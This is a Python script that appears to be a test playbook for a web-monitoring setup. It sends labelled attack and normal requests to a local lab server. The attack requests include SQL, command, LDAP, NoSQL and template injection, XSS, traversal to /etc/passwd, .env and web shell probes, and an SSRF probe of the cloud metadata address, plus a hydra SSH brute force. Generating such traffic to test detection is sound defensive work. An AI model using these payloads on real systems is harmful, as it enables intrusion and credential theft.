import subprocess
import time

TARGET = "http://192.168.1.17"

HTTP_SCENARIOS = [
    {
        "name": "SQL Injection",
        "category": "attack",
        "mitre_technique": "T1190",
        "path": "/rest/products/search?q=test%27%20OR%201%3D1--",
    },
    {
        "name": "XSS",
        "category": "attack",
        "mitre_technique": "T1059",
        "path": "/rest/products/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E",
    },
    {
        "name": "Scanner Tool Detected",
        "category": "attack",
        "mitre_technique": "T1595",
        "path": "/rest/products/search?q=test",
        "extra_args": ["-A", "sqlmap/1.6"],
    },
    {
        "name": "Admin Panel Probing",
        "category": "attack",
        "mitre_technique": "T1595",
        "path": "/admin",
    },
    {
        "name": "WordPress Scanning",
        "category": "attack",
        "mitre_technique": "T1595",
        "path": "/wp-admin",
    },
    {
        "name": "Directory Traversal",
        "category": "attack",
        "mitre_technique": "T1083",
        "path": "/rest/../../../../etc/passwd",
        "extra_args": ["--path-as-is"],
    },
    {
        "name": "Command Injection (semicolon)",
        "category": "attack",
        "mitre_technique": "T1059",
        "path": "/rest/products/search?q=test;cat",
    },
    {
        "name": "Command Injection (backtick)",
        "category": "attack",
        "mitre_technique": "T1059",
        "path": "/rest/products/search?q=`whoami`",
    },
    {
        "name": "Sensitive File Probe",
        "category": "attack",
        "mitre_technique": "T1552",
        "path": "/.env",
    },
    {
        "name": "Web Shell Probe",
        "category": "attack",
        "mitre_technique": "T1505",
        "path": "/uploads/shell.php",
    },
    {
        "name": "SSTI",
        "category": "attack",
        "mitre_technique": "T1190",
        "path": "/rest/products/search?q={{7*7}}{{config}}",
    },
    {
        "name": "LDAP Injection",
        "category": "attack",
        "mitre_technique": "T1190",
        "path": "/rest/user/login?user=*)(uid=*))(|(uid=*",
    },
    {
        "name": "SSRF Probe",
        "category": "attack",
        "mitre_technique": "T1190",
        "path": "/rest/products/search?q=http://169.254.169.254/latest/meta-data/",
    },
    {
        "name": "NoSQL Injection",
        "category": "attack",
        "mitre_technique": "T1190",
        "path": "/rest/user/login?email[$gt]=&password[$gt]=",
        "extra_args": ["-g"],
    },
    {
        "name": "Normal: Browse Products",
        "category": "normal",
        "mitre_technique": None,
        "path": "/rest/products/search?q=",
    },
    {
        "name": "Normal: Languages List",
        "category": "normal",
        "mitre_technique": None,
        "path": "/rest/languages",
    },
    {
        "name": "Normal: Score Board",
        "category": "normal",
        "mitre_technique": None,
        "path": "/api/Challenges/?name=Score%20Board",
    },
    {
        "name": "Normal: Legitimate Search",
        "category": "normal",
        "mitre_technique": None,
        "path": "/rest/products/search?q=apple",
    },
    {
        "name": "Normal: App Config",
        "category": "normal",
        "mitre_technique": None,
        "path": "/rest/admin/application-configuration",
    },
]

# Not HTTP-based, so not sent through the reverse proxy - run separately
SPECIAL_SCENARIOS = [
    {
        "name": "SSH Brute Force",
        "category": "attack",
        "mitre_technique": "T1110",
        "command": ["hydra", "-l", "webwatch", "-P", "/home/webwatch/wrong-passwords.txt", "ssh://192.168.1.17"],
    },
    {
        "name": "File Tamper",
        "category": "attack",
        "mitre_technique": "T1565",
        "command": ["sudo", "touch", "/etc/nginx/playbook-test-file.conf"],
    },
]


def runHttpScenario(scenario):
    extraArgs = scenario.get("extra_args", [])
    url = f"{TARGET}{scenario['path']}"
    command = ["curl", "-s", "-o", "/dev/null"] + extraArgs + [url]

    print(f"Running: {scenario['name']} ({scenario['category']})")
    subprocess.run(command, capture_output=True)


def runFuzzingScenario():
    shellCommand = (
        f"curl -s -o /dev/null "
        f"\"{TARGET}/rest/products/search?q=$(head -c 200 /dev/urandom | base64 | tr -d '\\n')\""
    )
    print("Running: Fuzzing Payload (attack)")
    subprocess.run(["bash", "-c", shellCommand], capture_output=True)


def runSpecialScenario(scenario):
    print(f"Running: {scenario['name']} ({scenario['category']})")
    subprocess.run(scenario["command"], capture_output=True)


def runPlaybook():
    for scenario in HTTP_SCENARIOS:
        runHttpScenario(scenario)
        time.sleep(2)

    runFuzzingScenario()
    time.sleep(2)

    for scenario in SPECIAL_SCENARIOS:
        runSpecialScenario(scenario)
        time.sleep(2)

    totalScenarios = len(HTTP_SCENARIOS) + 1 + len(SPECIAL_SCENARIOS)
    print(f"\nPlaybook complete. {totalScenarios} scenarios run against {TARGET}.")


if __name__ == "__main__":
    runPlaybook()
